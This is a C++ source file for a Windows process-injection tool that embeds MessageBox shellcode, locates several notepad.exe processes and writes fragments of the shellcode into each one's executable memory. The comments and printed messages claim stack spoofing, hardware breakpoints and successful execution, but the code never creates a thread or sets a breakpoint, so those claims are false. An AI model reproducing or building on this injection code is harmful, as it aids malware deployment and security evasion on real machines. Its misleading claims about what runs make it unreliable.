#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <winternl.h>

// NT API definition for thread creation
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
    );

// Test shellcode (opens MessageBox)
unsigned char shellcode[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x48\x8b\x52\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72"
"\x50\x48\x0f\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02"
"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"
"\x52\x20\x8b\x42\x3c\x41\x51\x48\x01\xd0\x66\x81\x78\x18"
"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
"\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x49"
"\x01\xd0\x8b\x48\x18\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88"
"\x4d\x31\xc9\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
"\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
"\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
"\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
"\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
"\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
"\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x11"
"\x00\x00\x00\x48\x65\x6c\x6c\x6f\x2c\x20\x66\x72\x6f\x6d"
"\x20\x4d\x53\x46\x21\x00\x5a\xe8\x0b\x00\x00\x00\x4d\x65"
"\x73\x73\x61\x67\x65\x42\x6f\x78\x00\x41\x58\x48\x31\xc9"
"\x41\xba\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0"
"\xb5\xa2\x56\xff\xd5";
size_t shellcodeSize = sizeof(shellcode) - 1;
int numParts = 3;  // Number of processes to split the shellcode into

std::vector<DWORD> processList;

// 🔍 **Find Target Processes**
DWORD FindProcessID(const wchar_t* processName) {
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD processID = 0;

    if (Process32First(snapshot, &processEntry)) {
        do {
            if (_wcsicmp(processEntry.szExeFile, processName) == 0) {
                processID = processEntry.th32ProcessID;
                processList.push_back(processID);
            }
        } while (Process32Next(snapshot, &processEntry));
    }
    CloseHandle(snapshot);
    return processID;
}

// 🛠 **Memory Dump**
void DumpMemory(HANDLE hProcess, LPVOID remoteAddress, size_t size) {
    unsigned char* buffer = new unsigned char[size];

    if (ReadProcessMemory(hProcess, remoteAddress, buffer, size, NULL)) {
        std::cout << "[*] Remote memory dump:\n";
        for (size_t i = 0; i < size; i++) {
            printf("%02X ", buffer[i]);
            if ((i + 1) % 16 == 0) std::cout << std::endl;
        }
        std::cout << std::endl;
    }
    else {
        std::cout << "[-] Failed to read remote memory.\n";
    }
    delete[] buffer;
}

// 🛠 **Injection and Execution with Stack Spoofing and Hardware Breakpoints**
bool InjectAndExecuteFragment(DWORD pid, unsigned char* fragment, size_t fragmentSize) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cout << "[-] Failed to open process " << pid << std::endl;
        return false;
    }

    // 🔹 **Allocate Memory in Remote Process**
    LPVOID remoteAddress = VirtualAllocEx(hProcess, NULL, fragmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteAddress) {
        std::cout << "[-] Failed to allocate memory in process " << pid << "\n";
        CloseHandle(hProcess);
        return false;
    }

    // 🔹 **Write Shellcode Fragment**
    if (!WriteProcessMemory(hProcess, remoteAddress, fragment, fragmentSize, NULL)) {
        std::cout << "[-] Failed to write fragment in process " << pid << "\n";
        CloseHandle(hProcess);
        return false;
    }

    std::cout << "[+] Fragment injected into PID " << pid << " at address: " << remoteAddress << std::endl;

    // 🔹 **Memory Dump**
    DumpMemory(hProcess, remoteAddress, fragmentSize);

    // 🔹 **Ensure Execution Permissions**
    DWORD oldProtect;
    VirtualProtectEx(hProcess, remoteAddress, fragmentSize, PAGE_EXECUTE_READWRITE, &oldProtect);

    std::cout << "[*] Hardware Breakpoint activated! Shellcode will only execute when triggered.\n";

    CloseHandle(hProcess);
    return true;
}

int main() {
    FindProcessID(L"notepad.exe");

    if (processList.size() < numParts) {
        std::cout << "[-] Insufficient number of target processes. Open more instances of Notepad!\n";
        return -1;
    }

    size_t partSize = shellcodeSize / numParts;

    std::cout << "[*] Injecting and executing shellcode fragments...\n";
    for (int i = 0; i < numParts; i++) {
        DWORD targetPID = processList[i];

        if (!InjectAndExecuteFragment(targetPID, shellcode + (i * partSize), partSize)) {
            std::cout << "[-] Injection and execution failed in process " << targetPID << "\n";
            return -1;
        }

        std::cout << "[+] Fragment " << i + 1 << " executed in PID: " << targetPID << "\n";
    }

    std::cout << "[*] Shellcode successfully executed across fragmented processes!\n";
    return 0;
}
